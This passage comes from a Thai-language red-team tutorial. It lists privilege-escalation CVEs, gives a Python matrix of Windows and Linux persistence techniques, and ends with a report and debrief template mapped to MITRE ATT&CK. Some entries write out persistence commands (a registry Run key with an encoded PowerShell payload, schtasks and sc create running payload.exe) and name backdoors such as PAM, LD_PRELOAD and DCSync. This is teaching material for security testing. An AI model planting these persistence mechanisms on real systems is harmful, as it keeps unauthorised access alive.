                "Sudo < 1.8.28: CVE-2019-14287 (sudo -u#-1 id)",
                "Sudo < 1.9.5p2: CVE-2021-3156 Buffer overflow",
                "Polkit < 0.112: CVE-2021-3560 (Pwnkit)",
                "Dirty COW: CVE-2016-5195 (kernel < 4.8.3)"
            ]
        }


if __name__ == '__main__':
    post = PostExploitation()
    
    print("WinPEAS categories:")
    for cat in post.windows_privesc_enum()['categories'][:5]:
        print(f"  - {cat}")
    
    print("\nSeImpersonatePrivilege tools:")
    for tool in post.seimpersonate_exploit()['tools']:
        print(f"  {tool['name']}: {tool['requirement']}")
    
    linux = post.linux_privesc_enum()
    print("\nLinux privesc checks:")
    print(f"  SUID: {linux['suid_check']}")
    print(f"  Sudo: {linux['sudo_check']}")
    print(f"  Caps: {linux['capabilities']}")
```

## Step 799: Persistence and Maintaining Access

เทคนิค Persistence เพื่อรักษา access หลังจาก reboot

```python
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class PersistenceMatrix:
    """Comprehensive persistence techniques matrix"""
    
    def windows_persistence_matrix(self) -> List[Dict]:
        return [
            {
                "technique": "Registry Run Keys",
                "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "privilege": "User",
                "stealth": "LOW",
                "command": "reg add HKCU\\...\\Run /v Update /d \"powershell -enc <payload>\""
            },
            {
                "technique": "Scheduled Task",
                "privilege": "User/SYSTEM",
                "stealth": "MEDIUM",
                "command": "schtasks /create /tn UpdateTask /tr 'payload.exe' /sc daily /ru SYSTEM"
            },
            {
                "technique": "WMI Subscription",
                "privilege": "Admin",
                "stealth": "HIGH",
                "detection": "Requires specialized tools to find"
            },
            {
                "technique": "COM Hijacking",
                "privilege": "User (HKCU)",
                "stealth": "HIGH",
                "location": "HKCU\\Software\\Classes\\CLSID\\{GUID}"
            },
            {
                "technique": "DLL Search Order",
                "privilege": "User",
                "stealth": "HIGH",
                "method": "Place malicious DLL in path searched before legitimate one"
            },
            {
                "technique": "Service Creation",
                "privilege": "Admin",
                "stealth": "LOW",
                "command": "sc create UpdateSvc binpath= \"cmd /c start /b payload.exe\" start= auto"
            },
            {
                "technique": "Golden Ticket",
                "privilege": "Domain Admin (once)",
                "stealth": "HIGH",
                "duration": "Valid for krbtgt password lifetime (typically 180 days)"
            },
            {
                "technique": "DCSync backdoor user",
                "privilege": "Domain Admin",
                "stealth": "MEDIUM",
                "method": "Add user with DCSync rights via ACL modification"
            }
        ]
    
    def linux_persistence_matrix(self) -> List[Dict]:
        return [
            {"technique": "Cron job", "privilege": "User", "location": "crontab -e"},
            {"technique": "Systemd service", "privilege": "Root", "location": "/etc/systemd/system/"},
            {"technique": "SSH authorized_keys", "privilege": "User", "location": "~/.ssh/authorized_keys"},
            {"technique": ".bashrc/.profile", "privilege": "User", "location": "~/.bashrc"},
            {"technique": "PAM backdoor", "privilege": "Root", "location": "/etc/pam.d/"},
            {"technique": "LD_PRELOAD", "privilege": "Root", "location": "/etc/ld.so.preload"},
            {"technique": "Shared library", "privilege": "Root", "location": "/usr/lib/"},
            {"technique": "MOTD script", "privilege": "Root", "location": "/etc/update-motd.d/"}
        ]


if __name__ == '__main__':
    persist = PersistenceMatrix()
    
    print("Windows persistence techniques:")
    for tech in persist.windows_persistence_matrix():
        stealth = tech.get('stealth', 'N/A')
        print(f"  [{stealth}] {tech['technique']} ({tech['privilege']})")
    
    print("\nLinux persistence:")
    for tech in persist.linux_persistence_matrix():
        print(f"  {tech['technique']}: {tech['location']}")
```

## Step 800: Red Team Reporting and Debrief

การเขียนรายงาน Red Team และการทำ debrief กับ Blue Team

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from datetime import datetime

@dataclass
class RedTeamReport:
    """Red team engagement report structure"""
    
    def executive_summary_template(self) -> Dict:
        return {
            "sections": [
                "Engagement Overview",
                "Assessment Objectives and Scope",
                "Key Findings Summary",
                "Attack Path Narrative",
                "Crown Jewels Achieved",
                "Detection & Response Assessment",
                "Risk Rating",
                "Top Recommendations"
            ],
            "risk_levels": ["Critical", "High", "Medium", "Low", "Informational"],
            "key_metrics": [
                "Time to Initial Access",
                "Time to Domain Admin",
                "Dwell Time (undetected)",
                "Number of Crown Jewels Reached",
                "Detection Rate (% of actions detected)",
                "Response Time (time from alert to action)"
            ]
        }
    
    def finding_template(self, severity: str = "Critical") -> Dict:
        return {
            "title": "Finding Title",
            "severity": severity,
            "cvss_score": 9.8 if severity == "Critical" else 7.5,
            "description": "Detailed description of the vulnerability/misconfiguration",
            "evidence": [
                "Screenshot showing exploitation",
                "Command output with timestamp",
                "Log entries"
            ],
            "attack_path": [
                "Step 1: Initial access via phishing",
                "Step 2: Credential theft from memory",
                "Step 3: Lateral movement via Pass-the-Hash",
                "Step 4: Domain Admin achieved"
            ],
            "impact": "Full domain compromise - all systems and data accessible",
            "recommendation": "Specific, actionable remediation steps",
            "mitre_techniques": ["T1566.001", "T1003.001", "T1550.002"],
            "references": ["https://attack.mitre.org/...", "https://cve.mitre.org/..."]
        }
    
    def debrief_agenda(self) -> Dict:
        return {
            "executive_debrief": {
                "audience": "CISO, CTO, Business leadership",
                "duration": "1 hour",
                "content": [
                    "Business risk summary",
                    "Critical findings only",
                    "Investment recommendations",
                    "Benchmark against industry"
                ]
            },
            "technical_debrief": {
                "audience": "SOC, Security team, IT",
                "duration": "3-4 hours",
                "content": [
                    "Walk through attack path step by step",
                    "Show what was detected vs missed",
                    "Live demo of key techniques",
                    "Collaborative remediation planning",
                    "Detection rule development",
                    "Q&A session"
                ]
            },
            "purple_team_exercise": {
                "description": "Re-run techniques with Blue Team watching",
                "benefit": "Tune SIEM/EDR rules in real-time",
                "outcome": "Measurable improvement in detection coverage"
            }
        }
    
    def mitre_coverage_report(self, techniques_used: List[str]) -> Dict:
        """Generate MITRE ATT&CK coverage report"""
        mitre_mapping = {
            "T1566.001": {"name": "Spearphishing Attachment", "tactic": "Initial Access"},
            "T1059.001": {"name": "PowerShell", "tactic": "Execution"},
            "T1547.001": {"name": "Registry Run Keys", "tactic": "Persistence"},
            "T1548.002": {"name": "UAC Bypass", "tactic": "Privilege Escalation"},
            "T1562.001": {"name": "Disable AV", "tactic": "Defense Evasion"},
            "T1003.001": {"name": "LSASS Memory", "tactic": "Credential Access"},
            "T1021.002": {"name": "SMB/Windows Admin Shares", "tactic": "Lateral Movement"},
            "T1041": {"name": "Exfiltration Over C2", "tactic": "Exfiltration"}
        }
        
        coverage = {}
        for technique_id in techniques_used:
            if technique_id in mitre_mapping:
                coverage[technique_id] = mitre_mapping[technique_id]
        
        return {
            "techniques_used": len(techniques_used),
            "mapped": len(coverage),
            "tactics_covered": list(set(v['tactic'] for v in coverage.values())),
            "coverage": coverage
        }


if __name__ == '__main__':
    report = RedTeamReport()
    
    print("Executive summary sections:")
    for section in report.executive_summary_template()['sections']:
        print(f"  - {section}")
    
    print("\nKey metrics:")
    for metric in report.executive_summary_template()['key_metrics']:
        print(f"  - {metric}")
    
    techniques = ["T1566.001", "T1059.001", "T1547.001", "T1003.001", "T1021.002"]
    coverage = report.mitre_coverage_report(techniques)
    print(f"\nMITRE Coverage: {coverage['techniques_used']} techniques")
    print(f"Tactics covered: {', '.join(coverage['tactics_covered'])}")
```

---

## สรุป Part 80

| Step | หัวข้อ | เนื้อหาสำคัญ |
|------|--------|-------------|
| 791 | Engagement Scoping | Scope, ROE, threat profiles, attack planning |
| 792 | Infrastructure | C2 tiers, Cobalt Strike, Sliver, redirectors |
| 793 | OSINT Recon | DNS, email harvesting, Shodan, GitHub |
| 794 | Initial Access | Phishing, EvilGinx, macro payloads, ISO |
| 795 | Lateral Movement | PtH, PtT, WMI, alternatives to PsExec |
| 796 | Data Exfiltration | DNS tunneling, cloud APIs, ICMP, steganography |
| 797 | C2 Management | Beacon timing, aggressor scripts, pivoting |
| 798 | Post-Exploitation | WinPEAS, SeImpersonate, Linux privesc |
| 799 | Persistence | Windows/Linux persistence matrix |
| 800 | Red Team Reporting | Report template, debrief, MITRE coverage |
